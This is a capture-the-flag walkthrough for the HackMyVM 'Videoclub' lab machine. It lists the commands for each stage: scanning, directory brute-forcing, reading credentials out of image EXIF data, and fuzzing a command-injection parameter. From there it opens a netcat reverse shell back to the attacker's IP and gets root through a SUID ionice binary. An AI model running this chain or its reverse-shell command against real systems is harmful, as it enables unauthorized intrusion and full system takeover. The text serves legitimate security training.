### Write up for https://hackmyvm.eu/machines/machine.php?vm=Videoclub ###

## Walkthrough



```bash
ip=<machines ip>
url=http://$ip
```

```bash
threader3000
```

Port 22 is open
Port 3377 is open

```bash
url=http://$ip:3377
```

```bash
feroxbuster -n -w  /usr/share/wordlists/dirb/common.txt -u $url -x php,txt,html,zip,bak,htm,.png,.jpg -t 100
```
robots.txt
```bash
videos
```
manual
images

```bash
visiting the robots.txt
```

If you scroll at the botom of the page you get 

list-defaulters.txt


```bash
wget $ip/list-defaulters.txt
```

```bash
subl list-de*
```
remove unessesary content and keep the words as wordlist.

lets try $url/videos

```bash
mkdir videos
cd videos
wget -r $url/videos
```

```bash
cd 10.10.10.106:3377 
cd videos
rm -rf *index.html*
ls -alh
```

after checking again the robots.txt we find the words exif tool lets try it

└─$ exiftool * | grep "Copyright"
LostDVD:k1nd3rs
⠓⠼⠙⠝⠎⠼⠚⠇⠼⠚
LostDVD=t3rm1n4t0r
LostDVD=m14_w4ll4c3
secret_film:c0ntr0l


```bash
cd ../images
ls -alh
```
exiftool * | grep "Copy"

Copyright                       : zerial_killer:bien_cabron


```bash
subl words.dic 
```
paste the names

zerial_killer
bien_cabron
c0n3h34ds
m14_w4ll4c3
k1nd3rs
c0ntr0l
t3rm1n4t0r

```bash
feroxbuster -n -w  words.dic -u $url -x php,txt,html -t 100
```

```text
200      GET       49l      146w     1106c http://10.10.10.106:3377/t3rm1n4t0r
200      GET      276l      110w     1064c http://10.10.10.106:3377/c0n3h34ds
200      GET     1516l      698w     4812c http://10.10.10.106:3377/k1nd3rs
200      GET       46l      143w     1129c http://10.10.10.106:3377/m14_w4ll4c3
200      GET        0l        0w        0c http://10.10.10.106:3377/c0ntr0l.php
```

```bash
cd ~/HMV/videoclub
wfuzz -t 500 -c -w list-defaulters.txt --hh BBB $url/c0ntr0l.php?FUZZ{TEST}=id
```
f1ynn

```bash
rsg 10.10.10.10 1234 nc
```

```bash
curl http://10.10.10.106:3377/c0ntr0l.php?f1ynn=nc%2010.10.10.10%201234%20-e%20/bin/bash
```


id
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade SHELL

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
ctr + z 

```bash
stty -a ; stty raw -echo ; fg 
```
reset

```bash
find / -perm -u=s 2>/dev/null	
```


```bash
https://gtfobins.github.io/gtfobins/ionice/
```

```bash
/home/librarian/ionice /bin/bash -p
```

```text
bash-5.0# id ; whoami
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
root
```
